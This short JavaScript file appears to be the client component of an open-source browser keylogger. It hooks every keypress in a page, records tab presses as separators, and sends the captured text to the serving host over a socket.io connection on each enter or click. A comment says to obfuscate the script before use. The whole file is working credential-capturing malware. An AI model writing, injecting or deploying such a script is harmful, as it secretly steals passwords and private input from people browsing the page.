// Copyright (c) 2013 Tom Steele
// See the file license.txt for copying permission
//
// run uglify-js or some other obfuscator before using
//
(function() {
  var socket = io.connect('http://' + window.location.host);
  var capture = '';
  document.onkeypress = keypress;
  document.onkeydown = keydown;
  document.onclick = onclick;

  function onclick() {
    socket.emit('data', {data: capture});
  }

  function keydown(evt) {
    if (evt.which === 9) {
      capture += '::';
    }
  }

  function keypress(evt) {
    if (evt.which === 13) {
      socket.emit('data', {data: capture});
      capture = '';
    }
    else {
      capture += String.fromCharCode(evt.which);
    }
  }
})();
